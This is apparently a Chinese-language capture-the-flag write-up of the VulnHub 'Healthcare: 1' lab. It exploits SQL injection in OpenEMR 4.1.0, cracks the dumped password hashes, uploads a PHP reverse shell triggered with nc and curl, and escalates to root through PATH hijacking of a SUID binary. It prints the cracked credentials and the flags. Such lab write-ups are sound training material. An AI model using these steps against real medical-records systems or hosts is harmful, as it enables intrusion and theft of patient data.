# Healthcare: 1

2025.03.02 https://www.vulnhub.com/entry/healthcare-1,522/

[video](https://www.bilibili.com/video/BV1ZBXfYiEzR/?spm_id_from=333.1387.collection.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.39

## Scan

```
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
```

ftp 目前不能匿名登陆。

web 发现 http://192.168.5.39/robots.txt 访问其中提到的路径都是不存在， gitweb 也是访问不存在。

发现 http://192.168.5.39/openemr/ 版本显示 OpenEMR v4.1.0 ，查找该版本是否有漏洞，存在 sql 注入，使用这个 exp https://www.exploit-db.com/exploits/49742 修改 py 文件中的 url 为 39 主机，执行脚本，在进行 user 用户爆破：

```
admin:3863efef9ee2bfbc51ecdca359c6302bed1389e8
medical:ab24aed5a7c4ad45615cd7e0da816eea39e4895d
```

john 爆破得到明文密码：

```
medical          (medical)
ackbar           (admin)
```

用 admin/ackbar 登陆系统，在左侧菜单 Administration -> Files 处上传 php shell 文件，保存在 /var/www/html/openemr/sites/default/images 中：

```
nc -lvnp 8888
curl http://192.168.5.39/openemr/sites/default/images/8888.php
```

得到了反弹的 shell：

```
bash-4.1$ id
id
uid=479(apache) gid=416(apache) groups=416(apache)
```

先找到了 user flag：

```
bash-4.1$ cat /home/almirant/user.txt
d41d8cd98f00b204e9800998ecf8427e
```

发现 medical 用户，用之前的密码 medical 可以切换到该用户。这里发现了密码文件：

```
[medical@localhost Documents]$ cat Passwords.txt
PCLINUXOS MEDICAL
root-root
medical-medical

OPENEMR
admin-admin
medical-medical
```

但是 root 的密码不是 root，另寻其他路径。

发现一堆 unknow 的 suid 程序，看看哪个可以利用：

```
-rwsr-xr-x 1 root root 11K Jun 11  2011 /usr/sbin/fileshareset (Unknown SUID binary!)
-rwsr-xr-x 1 root root 29K Dec 28  2010 /usr/bin/pumount (Unknown SUID binary!)
-rwsr-xr-x 1 root root 120K Nov 28  2010 /usr/bin/wvdial (Unknown SUID binary!)
-rws--x--x 1 root root 63K Jan 23  2010 /usr/bin/sperl5.10.1 (Unknown SUID binary!)
-rwsr-xr-x 1 root root 362K Jan 18  2011 /usr/bin/gpgsm (Unknown SUID binary!)
-rwsr-sr-x 1 root root 5.7K Jul 29  2020 /usr/bin/healthcheck (Unknown SUID binary!)
-rwsr-xr-x 1 root root 5.8K Sep 22  2011 /usr/bin/Xwrapper (Unknown SUID binary!)
```

发现 healthcheck 调用了一些系统命令：

```
[medical@localhost ~]$ strings /usr/bin/healthcheck
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
setuid
system
setgid
__libc_start_main
GLIBC_2.0
PTRhp
[^_]
clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h
```

可以进行命令劫持：

```
cd /tmp
echo '/bin/bash' > ifconfig
chmod +x ifconfig
PATH=/tmp:$PATH
/usr/bin/healthcheck
```

得到了最终的 root flag：

```
[root@localhost tmp]# id
uid=0(root) gid=0(root) groups=0(root),7(lp),19(floppy),22(cdrom),80(cdwriter),81(audio),82(video),83(dialout),100(users),490(polkituser),500(medical),501(fuse)
[root@localhost tmp]# cd /root
[root@localhost root]# ls
Desktop/  Documents/  drakx/  healthcheck*  healthcheck.c  root.txt  sudo.rpm  tmp/
[root@localhost root]# cat root.txt
██    ██  ██████  ██    ██     ████████ ██████  ██ ███████ ██████      ██   ██  █████  ██████  ██████  ███████ ██████  ██ 
 ██  ██  ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ ██ 
  ████   ██    ██ ██    ██        ██    ██████  ██ █████   ██   ██     ███████ ███████ ██████  ██   ██ █████   ██████  ██ 
   ██    ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██    
   ██     ██████   ██████         ██    ██   ██ ██ ███████ ██████      ██   ██ ██   ██ ██   ██ ██████  ███████ ██   ██ ██ 
                                                                                                                          

Thanks for Playing!

Follow me at: http://v1n1v131r4.com


root hash: eaff25eaa9ffc8b62e3dfebf70e83a7b
```
